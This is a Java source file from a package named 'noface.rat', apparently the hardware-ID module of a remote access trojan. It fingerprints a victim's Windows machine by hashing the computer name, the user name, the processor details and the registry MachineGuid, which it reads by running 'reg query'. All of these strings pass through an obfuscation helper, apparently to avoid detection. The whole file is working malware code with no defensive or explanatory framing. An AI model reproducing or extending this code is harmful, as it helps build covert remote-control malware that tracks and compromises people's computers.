package noface.rat;

import noface.config.S;

import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.Locale;
import java.util.UUID;
import java.util.prefs.Preferences;

public final class Id {

    public static String hwid() {
        try {
            String raw = join(
                    System.getenv(S.e("COMPUTERNAME")),
                    System.getenv(S.e("USERNAME")),
                    System.getenv(S.e("PROCESSOR_IDENTIFIER")),
                    System.getenv(S.e("SystemDrive")),
                    machineGuid(),
                    System.getProperty("os.arch", "")
            );
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] d = md.digest(raw.getBytes(StandardCharsets.UTF_8));
            StringBuilder b = new StringBuilder(32);
            for (int i = 0; i < 16; i++) b.append(String.format("%02x", d[i]));
            return b.toString();
        } catch (Exception e) {
            return UUID.randomUUID().toString().replace("-", "");
        }
    }

    private static String machineGuid() {
        try {
            Preferences p = Preferences.userRoot();
            String k = S.e("MachineGuid");
            String v = p.get(k, null);
            if (v != null && !v.isBlank()) return v;
            Process pr = new ProcessBuilder(
                    S.e("reg"), S.e("query"),
                    S.e("HKLM\\SOFTWARE\\Microsoft\\Cryptography"),
                    S.e("/v"), S.e("MachineGuid")
            ).redirectErrorStream(true).start();
            String out = new String(pr.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
            pr.waitFor();
            for (String line : out.split("\\R")) {
                if (line.toLowerCase(Locale.ROOT).contains("machineguid")) {
                    String[] parts = line.trim().split("\\s+");
                    if (parts.length >= 3) return parts[parts.length - 1];
                }
            }
        } catch (Exception ignored) {
        }
        return "";
    }

    private static String join(String... xs) {
        StringBuilder b = new StringBuilder();
        for (String x : xs) {
            if (x != null && !x.isBlank()) b.append(x).append('|');
        }
        return b.toString();
    }

    private Id() {}
}
